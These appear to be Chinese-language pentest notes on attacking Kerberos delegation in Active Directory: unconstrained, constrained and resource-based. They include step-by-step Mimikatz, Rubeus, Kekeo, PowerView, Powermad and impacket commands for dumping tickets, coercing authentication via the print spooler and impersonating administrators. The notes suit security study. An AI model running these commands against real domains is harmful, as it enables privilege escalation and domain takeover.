\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u5927\u81f4\u6d41\u7a0b\uff1a \u7528\u6237\u8bbf\u95ee\u5f00\u542f\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1A \uff08\u60c5\u51b5\u4e00\uff1a\u65e0S4U2SELF\u53c2\u4e0e\uff09\u9996\u5148\u9700\u8981\u7ecf\u8fc7KDC\u8ba4\u8bc1\uff0cKDC\u53d1\u73b0\u670d\u52a1A\u5f00\u542f\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u4e8e\u662f\u5728TGS_RES\u8fd4\u56de\u7ed9\u7528\u6237ST1\uff08\u53ef\u8f6c\u53d1ST\uff09\uff0c\u7528\u6237\u62ff\u7740ST1\u8bbf\u95ee\u670d\u52a1A\uff0c\u670d\u52a1A\u5148\u4e0eKDC\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u83b7\u5f97\u4e00\u4e2a\u6709\u6548TGT\uff0c\u7136\u540e\u62ff\u7740ST1\u7ecf\u8fc7S4U2PROXY\u534f\u8bae\u5411KDC\u53d1\u8d77TGS_REQ\uff0cKDC\u8fd4\u56deST2\uff08\u7528\u6237\u8eab\u4efd\u7684ST\uff09\uff0c\u7136\u540e\u670d\u52a1A\u62ff\u7740ST2\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1\u3002 \uff08\u60c5\u51b5\u4e8c\uff1a\u6709S4U2SELF\u53c2\u4e0e\uff09\u7528\u6237\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\uff08\u5982NTLM\u8ba4\u8bc1\uff0c\u8868\u5355\u8ba4\u8bc1\u7b49\uff09\u83b7\u53d6\u4e86\u670d\u52a1A\u7684\u4fe1\u4efb\uff0c\u4f46\u662f\u6b64\u65f6\u670d\u52a1A\u5e76\u6ca1\u6709\u6765\u81ea\u7528\u6237\u7684ST1\uff0c\u6309\u60c5\u51b5\u4e00\u4e2d\u7684\u6d41\u7a0b\uff0c\u670d\u52a1A\u5c31\u4e0d\u80fd\u5b8c\u6210\u59d4\u6d3e\u3002\u6240\u4ee5\u8fd9\u4e2a\u65f6\u5019\u670d\u52a1A\u4f1a\u4ee5\u81ea\u5df1\u7684\u8eab\u4efd\u5411KDC\u53d1\u8d77\u7533\u8bf7\u83b7\u53d6\u4e00\u4e2a\u53ef\u8f6c\u53d1TGT\uff08\u83b7\u53d6KDC\u4fe1\u4efb\uff09\uff0c\u7136\u540e\u7528\u8fd9\u4e2aTGT\u53d1\u8d77TGS_REQ\u83b7\u5f97\u6307\u5b9a\u7528\u6237\u7684ST1\uff0c\u65e2\u7136\u83b7\u53d6\u4e86ST1\uff0c\u5c31\u7ee7\u7eed\u60c5\u51b5\u4e00\u4e2d\u7684\u6d41\u7a0b\u5373\u53ef\u4e86\u3002 \u4e5f\u5c31\u662f\u8bf4S4U2SELF\u662f\u7528\u6237\u901a\u8fc7\u975ekerberos\u534f\u8bae\u5b8c\u6210\u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\uff0c\u81ea\u52a8\u5411KDC\u83b7\u53d6ST1\u7684\u4e00\u4e2a\u534f\u8bae\u3002 \u800cS4U2PROXY\u5219\u662f\u5c06ST1\u53d1\u7ed9KDC\uff0c\u4f7f\u5176\u53d8\u73b0\u4e3a\u6210\u81ea\u5df1\u53ef\u7528\u7684 ST2 \u7684\u4e00\u4e2a\u534f\u8bae\u3002 \u542f\u7528\u65b9\u6cd5: \u5176\u4e2d\u88ab\u6dfb\u52a0\u7684\u670d\u52a1\u5219\u662f\u5141\u8bb8\u88ab\u59d4\u6d3e\u5230\u7684\u670d\u52a1 \u82e5\u542f\u7528\u7684\u662f \u4ec5\u4f7f\u7528kerberos\uff0c\u90a3\u4e48useraccountcontrol\u5c5e\u6027\u4ec5\u6709 workstation_trust_account. \u82e5\u542f\u7528\u4efb\u4f55\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u5c31\u4f1a\u6709 TrustedToAuthenticationForDelegation \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e Windows Server 2012\u4e2d\u5f15\u5165\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u53ea\u80fd\u5728\u8fd0\u884cWindows Server 2012\u6216Windows Server 2012 R2\u53ca\u4ee5\u4e0a\u7684\u57df\u63a7\u5236\u5668\u4e0a\u914d\u7f6e \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u4e0d\u9700\u8981\u57df\u7ba1\u7406\u5458\u524d\u6765\u8bbe\u7f6e\uff0c\u800c\u628a\u8bbe\u7f6e\u59d4\u6d3e\u7684\u6743\u9650\u4ea4\u7ed9\u4e86\u81ea\u8eab\u3002 \u5176\u5b9e\u5c31\u662f\u53ef\u4ee5\u6446\u8131\u57df\u63a7\u6765\u4e3b\u52a8\u8bbe\u7f6e\u81ea\u5df1\u53ef\u4ee5\u88ab\u54ea\u4e9b\u8d26\u6237\u59d4\u6d3e\u8bbf\u95ee\u3002 \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u6709\u5de8\u5927\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e0a\u9762\u6211\u4eec\u8bf4\u8fc7\uff0c\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u5b9e\u8d28\u5c31\u662f\u628a\u7528\u6237\u7684TGT\u5b58\u5165lassa\u8fdb\u7a0b\uff0c\u4ece\u800c\u6a21\u62df\u7528\u6237\u8eab\u4efd\u8fdb\u884c\u5404\u79cd\u59d4\u6d3e\u8bbf\u95ee\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u63a7\u5236\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u7684\u673a\u5668\uff0c\u7136\u540edump\u51fa\u6240\u6709\u7684\u7968\u636e\uff0c\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86\u6240\u6709\u7ecf\u8fc7\u8be5\u670d\u52a1\u8fdb\u884c\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u7528\u6237\u7684\u8eab\u4efd\u4e86\u3002 1.\u8fdb\u884c\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u626b\u63cf \u8fd9\u91cc\u63d0\u4e00\u4e0b\u600e\u4e48\u521b\u5efa\u6709SPN\u7684\u670d\u52a1\u8d26\u6237\u3002 \u53ea\u9700\u518d\u57df\u63a7\u91cc\u6267\u884c setspn -U -A spn_type username \u5373\u53ef \u5176\u4e2dspn_type\u5373SPN\u7684\u683c\u5f0f\uff1a MSSQLSvc/:[ | ] MSSQLSvc \u662f\u8981\u6ce8\u518c\u7684\u670d\u52a1\u3002 \u662f\u670d\u52a1\u5668\u7684\u5b8c\u5168\u9650\u5b9a\u57df\u540d\u3002 \u662f TCP \u7aef\u53e3\u53f7\u3002 \u662f SQL Server \u5b9e\u4f8b\u7684\u540d\u79f0\u3002 \u8fd9\u91cc\u6211\u4eec\u968f\u4fbf\u8f93\u4e00\u4e2a\uff0c\u6bd4\u5982 sb/caonima \u8fd9\u79cd\u90fd\u884c. \u8fd9\u91cc\u91c7\u7528powersploit\u4e0b\u7684powerview.ps1 \u6839\u636e\u6211\u7f51\u4e0a\u5f88\u591a\u641c\u7d22\u7ed3\u679c\uff0c\u67e5\u627e\u975e\u7ea6\u675f\u59d4\u6d3e\u670d\u52a1\u8d26\u6237\u53ea\u9700\u8c03\u7528 Get-NetUser -Unconstrained -Domain de1ay.com Get-NetUser -Domain de1ay.com|? {$_.useraccountcontrl -like \"trusted_for_delegation\"} \u8fd9\u4e2a\u547d\u4ee4\u5373\u53ef\uff0c\u4f46\u662f\u6211\u4e0b\u8f7d\u4e0b\u6765\u7684powerview\u91cc\u7684get-netuser\u91cc\u5374\u6ca1\u6709unconstrained\u53c2\u6570\uff0c\u5f88\u70e6\u3002\u6240\u4ee5\u7528\u4e00\u4e2a\u6bd4\u8f83\u539f\u59cb\u7684\u65b9\u6cd5\u6765\u5224\u522b\uff08\u9002\u5408\u5728\u7528\u6237\u5c11\u7684\u60c5\u51b5\u4e0b\uff09 \u76f4\u63a5\u8c03\u7528 Get-NetUser -SPN \u627e\u5230\u6240\u6709\u670d\u52a1\u8d26\u6237\u6216\u8005Get-domaincomputer\u627e\u5230\u6240\u6709\u673a\u5668\u8d26\u6237\uff0c\u7136\u540e\u5224\u65ad\u5176useraccountcontrl\u91cc\u6709\u6ca1\u6709trusted_for_delegation,\u82e5\u6709\uff0c\u5219\u8bf4\u660e\u5f00\u542f\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u67e5\u8be2\u975e\u7ea6\u675f\u59d4\u6d3e\u673a\u5668\u8d26\u6237\u5219\u7528 Get-domaincomputer -unconstrained -domain const.com 2.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb \u4ec5\u80fd\u57fa\u4e8e\u673a\u5668\u8d26\u6237 \u5982\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u4e2a\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u5185\u5b58\u4e2d\u7684tgt\u8fbe\u5230\u4efb\u610f\u7528\u6237\u8bbf\u95ee\u7684\u76ee\u7684\u3002 \u5728\u88ab\u63a7\u5236\u7684\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5668\u4e0a\u4f7f\u7528mimikatz\u3002 privilege::debug \u63d0\u6743 sekurlsa::tickets \u67e5\u770b\u672c\u673a\u6240\u6709\u7968\u636e \u901a\u8fc7\u4ee5\u4e0a\u547d\u4ee4\u83b7\u53d6\u7968\u636e,\u5982\u679c\u7ba1\u7406\u5458\u8bbf\u95ee\u4e86\u672c\u673a\u7684\u4e00\u4e9b\u670d\u52a1\uff0c\u90a3\u4e48\u5b83\u7684TGT\u5c31\u4f1a\u88ab\u622a\u83b7\u653e\u5165\u5185\u5b58\u3002 \u6211\u4eec\u6a21\u62df\u7ba1\u7406\u5458\u8c03\u7528\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u7684smb\u670d\u52a1 \u6211\u4eec\u56de\u5230\u975e\u7ea6\u675f\u59d4\u6d3e\u673a\uff0c\u67e5\u770b\u7968\u636e tgt\u88ab\u622a\u83b7,\u6211\u4eec\u7528 sekurlas::tickets /export \u628a\u7968\u636e\u5bfc\u51fa\u6765 \u7136\u540emimikatz\u91cc\u4f7f\u7528 kerberos::ptt \u7968\u636e\u6587\u4ef6\u540d \u5c06\u7968\u636e\u6ce8\u5165\u5185\u5b58 \u8bbf\u95ee\u57df\u63a7c\\$ \u6210\u529f 3.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u914d\u5408 Spooler\u6253\u5370\u673a\u670d\u52a1 \u7eaf\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u5f88\u9e21\u808b\uff0c\u56e0\u4e3a\u5fc5\u987b\u8981\u5176\u4ed6\u7528\u6237\u901a\u8fc7\u4f60\u8fdb\u884c\u59d4\u6d3e\u8bbf\u95ee\u3002 \u4f46\u662f \uff1a\u5229\u7528Windows\u6253\u5370\u7cfb\u7edf\u8fdc\u7a0b\u534f\u8bae \uff08MS-RPRN\uff09 \u4e2d\u7684\u4e00\u79cd\u65e7\u7684\u4f46\u662f\u9ed8\u8ba4\u542f\u7528\u7684\u65b9\u6cd5\uff0c\u5728\u8be5\u65b9\u6cd5\u4e2d\uff0c\u57df\u7528\u6237\u53ef\u4ee5\u4f7f\u7528MS-RPRN RpcRemoteFindFirstPrinterChangeNotification\uff08Ex\uff09 \u65b9\u6cd5\u5f3a\u5236\u4efb\u4f55\u8fd0\u884c\u4e86 Spooler \u670d\u52a1\u7684\u8ba1\u7b97\u673a\u4ee5\u901a\u8fc7 Kerberos \u6216 NTLM \u5bf9\u653b\u51fb\u8005\u9009\u62e9\u7684\u76ee\u6807\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u914d\u5408\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\uff0c\u7b80\u76f4\u7206\u70b8\uff0c\u53ef\u4ee5\u4e3b\u52a8\u62ff\u5230\u5176\u4ed6\u7528\u6237\u7684TGT\u3002- \u800c\u4e14splooer\u670d\u52a1\u662f\u9ed8\u8ba4\u8fd0\u884c\u7684\u3002\uff08\u56fe\u6e90WIN7\uff09 \u4f7f\u5176\u4ed6\u4e3b\u673a\u5f3a\u884c\u4e0e\u81ea\u5df1\u53d1\u751f\u8eab\u4efd\u9a8c\u8bc1\u7684\u811a\u672c\uff1a\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u4e00\u4e0b https://github.com/leechristensen/SpoolSample.git \u5728\u6b64\u4e4b\u524d\u9700\u8981\u5f00\u542f\u76d1\u542c\u6765\u81ea\u5176\u4ed6\u4e3b\u673a\u7684TGT\uff0c\u8fd9\u91cc\u7528\u7684\u662frubeus Rubeus.exe monitor /interval:1 /filteruser:xx \u7136\u540e\u4f7f\u7528 SpoolSample.exe XX win7 ,\u8ba9\u6307\u5b9a\u673a\u5668\u8bbf\u95eeWIN7\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1 \u7136\u540e\u83b7\u5f97TGT\uff0c\u4e0b\u73ed\u3002 \u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb \u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u5927\u81f4\u653b\u51fb\u6d41\u7a0b\u662f: (\u5229\u7528S4U2SELF=>)\u5982\u679c\u6211\u4eec\u83b7\u5f97\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u7684NTLM hash\u6216\u8005\u660e\u6587\u5bc6\u7801\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4ee5\u6b64\u6765\u5411KDC\u53d1\u9001\u4e00\u4e2aTGT\u7533\u8bf7\uff0c\u83b7\u5f97\u4e00\u4e2a\u53ef\u8f6c\u53d1\u7684TGT\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u53ef\u8f6c\u53d1\u7684TGT\u8c03\u7528S4U2SELF\u534f\u8bae\uff0c\u83b7\u5f97\u4e00\u4e2a\u9488\u5bf9\u81ea\u5df1\u7684ST1\u7968\u636e\uff08\u5176\u4e2dST1\u7968\u636e\u4e2d\u7684\u8bf7\u6c42\u7528\u6237\u53ef\u4ee5\u4efb\u610f\u4f2a\u9020\uff09.\u7136\u540e\u7528\u8fd9\u4e2aST1\u7968\u636e\u53bb\u5411KDC\u8bf7\u6c42ST2\uff0c\u7136\u540e\u7528ST2\u53bb\u8bbf\u95ee\u670d\u52a1\uff0c\u6b64\u65f6\u6211\u4eec\u8bbf\u95ee\u7684\u8eab\u4efd\u5c31\u662f\u6211\u4eec\u4efb\u610f\u4f2a\u9020\u7684\u8eab\u4efd\u4e86. \u91cd\u70b9\u662f\u53ea\u8981\u83b7\u5f97\u4e86\u53ef\u8f6c\u53d1TGT\uff0c\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5c31\u53ef\u4ee5\u4efb\u610f\u4f2a\u9020\u5176\u4ed6\u7528\u6237\u7684ST1\u7968\u636e\u8bf7\u6c42\uff0c\u592a\u53ef\u6015\u4e86\u3002 \u8fd9\u4e2a\u653b\u51fb\u7684\u6700\u5927\u524d\u63d0\u662f\u6211\u4eec\u5f97\u83b7\u5f97\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u7684NTLM HASH\u6216\u8005\u660e\u6587\u5bc6\u7801,\u7136\u540e\u6211\u4eec\u624d\u80fd\u6210\u529f\u7684\u5f97\u5230\u53ef\u8f6c\u53d1TGT\uff0c\u7136\u540e\u624d\u80fd\u5f97\u5230\u63a5\u4e0b\u6765\u7684\u4e00\u5207\u3002 \u9996\u5148\u914d\u7f6e\u597d\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237 \u6ce8\u610f\u9009\u7528 \u4f7f\u7528\u4efb\u4f55\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae \u6211\u4eec\u5148\u4fe1\u606f\u641c\u96c6\uff1a\u770b\u54ea\u4e9b\u7528\u6237\u662f\u5f00\u542f\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u3002\u4e00\u624bpowerview\u5b89\u6392\u4e0a \u7bad\u5934\u6307\u51fa\u7684\u5730\u65b9\u5c31\u662f\u53ef\u4ee5\u88ab\u59d4\u6d3e\u8bbf\u95ee\u7684\u670d\u52a1 \u6211\u4eec\u7528kekeo\u6765\u5b9e\u73b0\u653b\u51fb. tgt::ask /user:xx /domain:xx /password:xx /ticket:test.kirbi\u8fd9\u91cc\u7684/password\u53ef\u4ee5\u6539\u6210/NTLM:xx \u83b7\u5f97TGT\u8f6c\u53d1\u7968\u636e tgs::s4u /tgt:file_name /user:administrator /service:cifs/DC tgt\u5904\u6539\u4e3a\u521a\u521a\u5f97\u5230\u7684TGT\u6587\u4ef6\u7684\u540d\u5b57\uff0c\u8fd9\u4e2a\u547d\u4ee4\u6267\u884c\u540e\u5f97\u5230administrator\u8eab\u4efd\u7684 ST2 \u628a\u6700\u540e\u83b7\u5f97\u7684\u7968\u636e\u7528mimikatz kerberos::ptt \u6ce8\u5165\u5185\u5b58\uff0c\u5b8c\u4e8b\u3002 \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e refer: https://xz.aliyun.com/t/7454 https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd \u5b9e\u7528\u573a\u666f\uff1a1.\u63d0\u6743 2.\u4e00\u4e9b\u60c5\u51b5\u4e0b\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u51ed\u636e\u8fdc\u63a7pc\uff0c\u901a\u8fc7\u6b64\u65b9\u6cd5\u66f2\u7ebf\u6551\u56fd\u3002 \u524d\u63d0\uff1a\u6709\u4e00\u4e2a\u7528\u6237\u5bf9\u4e00\u4e2a\u673a\u5668\u6709genericAll\uff0cWriteAccountRestrictions\u7b49\u6743\u9650 \u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a 1.S4U2SELF \u534f\u8bae\u53ef\u4ee5\u5728\u7528\u6237\u6ca1\u6709\u914d\u7f6e TrustedToAuthenticationForDelegation \u5c5e\u6027\uff08\u5373\u5f00\u542f\u4f7f\u7528\u4efb\u4f55\u534f\u8bae\u8ba4\u8bc1\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff09\u65f6\u88ab\u8c03\u7528\uff0c\u4f46\u662f\u8fd4\u56de\u7684ST\u662f\u4e0d\u53ef\u88ab\u8f6c\u53d1\u7684\u3002 2.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u4e3b\u673a \u5728\u88ab\u53e6\u4e00\u53f0\u4e3b\u673a\u59d4\u6d3e\u8bbf\u95ee\u65f6\uff0c\u5728S4U2PROXY\u8fc7\u7a0b\u4e2d\u63d0\u4ea4\u8fc7\u6765\u7684ST\u5982\u679c\u5373\u4f7f\u662f\u4e0d\u53ef\u8f6c\u53d1\u7684\u3002KDC\u4f9d\u65e7\u4f1a\u8fd4\u56de\u6709\u6548\u7684ST2\u3002 3.\u6bcf\u4e2a\u666e\u901a\u57df\u7528\u6237\u9ed8\u8ba4\u53ef\u4ee5\u521b\u5efa\u81f3\u591a\u5341\u4e2a\u673a\u5668\u8d26\u6237\uff08 \u7531MachineAccountQuota\u5c5e\u6027\u51b3\u5b9a \uff09\uff0c\u6bcf\u4e2a\u673a\u5668\u8d26\u6237\u88ab\u521b\u5efa\u65f6\u90fd\u4f1a\u81ea\u52a8\u6ce8\u518cSPN: RestrictedKrbHost/domain \u548c HOST/domain \u8fd9\u4e24\u4e2aSPN \u653b\u51fb\u6d41\u7a0b: \u5047\u8bbe\u5f00\u542f\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5668\u4e3aA 1.\u9996\u5148\u8981\u6709\u4e00\u4e2a\u5bf9\u5f53\u524d\u8ba1\u7b97\u673a\u6709\u5199\u6743\u9650\u7684\u8d26\u6237\uff0c\u624d\u80fd\u5bf9A\u8bbe\u7f6e\u53ef\u4ee5 \u88ab \u59d4\u6d3e\u8bbf\u95ee\u7684\u670d\u52a1\u8d26\u6237\u3002 2.\u5229\u7528\u5f53\u524d\u8d26\u6237\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u5e76\u914d\u7f6e\u597d\u673a\u5668\u8d26\u6237\u5230A\u7684 \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e 3.\u56e0\u4e3a\u673a\u5668\u8d26\u6237\u662f\u6211\u4eec\u521b\u5efa\u7684\uff0c\u6211\u4eec\u77e5\u9053\u4ed6\u7684\u5bc6\u7801\u8d26\u6237\uff0c\u53ef\u4ee5\u8ba9\u5b83\u5229\u7528S4U2SELF\u534f\u8bae\u83b7\u5f97\u4e00\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u901a\u8fc7S4U2PROXY\uff0c\u5728\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u57fa\u7840\u4e0a\u83b7\u5f97\u6709\u6548\u7684\u8bbf\u95eeA cifs\u670d\u52a1\u7684ST2\u3002 4.\u7528ST2\u8bbf\u95eeA\u7684CIFS\u670d\u52a1\uff0c\u6743\u9650\u83b7\u5f97\u3002 \u5b9e\u64cd 1.rebeus \u8fd9\u4e2a\u653b\u51fb\u8bf4\u767d\u4e86\u5c31\u662f\u4e2a\u63d0\u6743... \u9996\u5148\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u57df\u63a7\u662f\u5426\u662fwin2012\u4ee5\u4e0a\u7684\u4e3b\u673a\uff0c\u56e0\u4e3a\u53ea\u6709\u8fd9\u6837\u624d\u80fd\u5f00\u542f \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u6211\u4eec\u4f7f\u7528powersploit\u4e0b\u7684powerview\u811a\u672c\u3002\u6267\u884c\u547d\u4ee4 get-netdomaincontroller \u53ef\u4ee5\u83b7\u5f97\u57df\u63a7WIN\u7248\u672c \u7136\u540e\u6211\u4eec\u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u54ea\u53f0\u4e3b\u673a\u6709\u5199\u6743\u9650\u3002\u56e0\u4e3a\u662f\u5b9e\u9a8c\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u6765\u770b\u770b\u600e\u4e48\u914d\u7f6e\u4e00\u4e2a\u7528\u6237\u5bf9\u4e00\u4e2a\u673a\u5668\u7684\u6743\u9650\u3002 \u76f4\u63a5\u5728\u57df\u63a7\u4e0a\u627e\u5230\u67d0\u4e3b\u673a\uff0c\u7136\u540e\u8fdb\u5165\u5728\u5c5e\u6027\u91cc\u8fdb\u5165\u5b89\u5168\u9009\u9879\u5361\uff0c\u6dfb\u52a0\u67d0\u7528\u6237\uff0c\u7136\u540e\u7ed9\u8fd9\u4e2a\u7528\u6237\u5206\u914d\u6743\u9650\u5373\u53ef\u3002 \u6211\u4eec\u4f9d\u65e7\u4f7f\u7528powerview\u3002\u5148\u8c03\u7528 Get-DomainUser -Identity username -Properties objectsid \u6765\u83b7\u53d6\u5f53\u524d\u7528\u6237SID \u7136\u540e Get-DomainObjectAcl -Identity \u4e3b\u673a\u540d | ?{$_.SecurityIdentifier -match \"\u521a\u521a\u5f97\u5230\u7684SID\"} \u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u67d0\u53f0\u4e3b\u673a\u662f\u5426\u6709\u5199\u6743\u9650\u3002 \u5982\u679c\u6709 GenericAll\uff08\u5b8c\u5168\u63a7\u5236\u6743\uff09\uff0cGenericWrite\u3001WriteProperty\u3001WriteDacl \u8fd9\u4e9b\u5c5e\u6027\uff0c\u5c31\u8bf4\u660e\u8be5\u7528\u6237\u80fd\u4fee\u6539\u8ba1\u7b97\u673a\u7684\u8d26\u6237\u5c5e\u6027\u3002 \u5982\u56fe\u770b\u5230\u6211\u4eec\u5bf9WIN7\u8fdb\u884c\u64cd\u4f5c \u597d\u7684\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u8981\u521b\u7acb\u4e00\u4e2a\u673a\u5668\u7528\u6237\u4e86\u3002\u6839\u636e\u7f51\u4e0a\u641c\u7d22\u7ed3\u679c\uff0c\u4f7f\u7528powermad\u8fd9\u4e2aps\u811a\u672c\u53ef\u4ee5\u5f88\u5feb\u6377\u7684\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u7528\u6237\u3002 https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hack;system -Password $(ConvertTo-SecureString \"hack\" -AsPlainText -Force) \u597d\u7684\uff0c\u6211\u4eec\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5bc6\u7801hack\uff0c\u540d\u4e3ahacksystem\u7684\u673a\u5668\u8d26\u6237\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u914d\u7f6ehacksystem\u5230WIN7\u7684\u59d4\u6d3e\u4e86\u3002\u6211\u4eec\u9700\u8981\u505a\u7684\uff0c\u662f\u4fee\u6539WIN7\u7684 msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\u7684\u503c \uff0c\u8fd9\u4e2a\u64cd\u4f5c\u6211\u4eec\u7528powerview\u5b9e\u73b0\u3002 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)\" #\u8fd9\u513f\u7684sid\u662f\u6211\u4eec\u521b\u5efa\u7684#\u673a\u5668\u7528\u6237#evilsystem\u7684sid $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose \u81f3\u4e8e\u673a\u5668\u8d26\u6237SID\u600e\u4e48\u83b7\u5f97\uff0cpowerview\u4e0b\u7684 get-domiancomputer hacksystem \u7136\u540e\u4f7f\u7528 Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity \u67e5\u770b\u59d4\u6d3e\u662f\u5426\u8bbe\u7f6e\u6210\u529f Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose \u6b64\u547d\u4ee4\u53ef\u4ee5\u6e05\u9664 msds-allowedtoactonbehalfofotheridentity\u5c5e\u6027\u7684\u503c \u73b0\u5728\u90fd\u7edf\u7edf\u8bbe\u7f6e\u597d\u4e86\uff0c\u5f00\u59cb\u4e0b\u4e00\u6b65\u5427\u3002 \u7f51\u4e0a\u4e00\u822c\u7528\u7684rubeus\uff0c\u8fd9\u91cc\u6211\u7528kekeo\u5427 Rubeus.exe hash /user:xxx /password:xxx /domain:xxx \u672c\u5730\u8fd0\u7b97\u51fa\u673a\u5668\u7528\u6237ntlm hash \u8fd9\u91cc\u501f\u7528\u4e00\u4e0b\u522b\u4eba\u7684\u56fe Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u5199\u5165\u7968\u636e \u7136\u540e\u6211\u5728\u672c\u673a\u4f7f\u7528\u4ee5\u4e0a\u65b9\u6cd5\u540eklist\u4e00\u4e0b\uff0c\u53d1\u73b0\u786e\u5b9e\u5b58\u5728\u7968\u636e \u4f46\u662fdir \\test1\\c\\$\u65f6\u672c\u673a\u83ab\u540d\u5176\u5999\u4e0d\u80fd\u8fdb\u884ckerberos\u9a8c\u8bc1\uff0c\u6211\u670d\u4e86\u300b\u3002\u3002\u4f46\u4e0d\u7ba1\u600e\u6837\uff0c\u6211\u4eec\u62ff\u5230\u94f6\u7968\u4e86(\u8fd9\u4e2a\u7b14\u8bb0\u5199\u4e8e2021\u5e74\uff0c\u7b2c\u4e00\u6b21\u5b9e\u6218\u9047\u5230\u57282023\u5e74\uff0c\u8fd8\u662f\u9047\u5230\u4e86\u7c7b\u4f3c\u7684\u5751\uff09 2.impacket \u52a0\u673a\u5668\u8d26\u6237 ./addcomputer.py -computer-name 'aa$' -computer-pass 'applem1@123' -dc-host dc.a.cn 'a.cn/testusername:testpassword' \u5c06\u673a\u5668\u8d26\u6237\u52a0\u5165\u673a\u5668\u7684msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027 ./rbcd.py rbcd.py -delegate-from 'weipai_test$' -delegate-to 'victimmachine$' -dc-ip '172.21.32.31' -action 'write' 'a.cn'/'testusername':'testpassword' \u8bfb\u4e00\u4e0b\u673a\u5668\u8d26\u6237\u7684msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027\u770b\u770b\u5199\u5165\u6210\u529f\u6ca1 ./rbcd.py -delegate-to 'victimmachine$' -dc-ip '172.21.32.31' -action 'read' 'a.cn'/'testusername':'testpassword' \u62ffst\uff0c\u7136\u540e\u6ce8\u5165\u5185\u5b58\u5373\u53ef ./getST.py -spn 'cifs/victimmachine' -impersonate Administrator -dc-ip 172.21.32.31 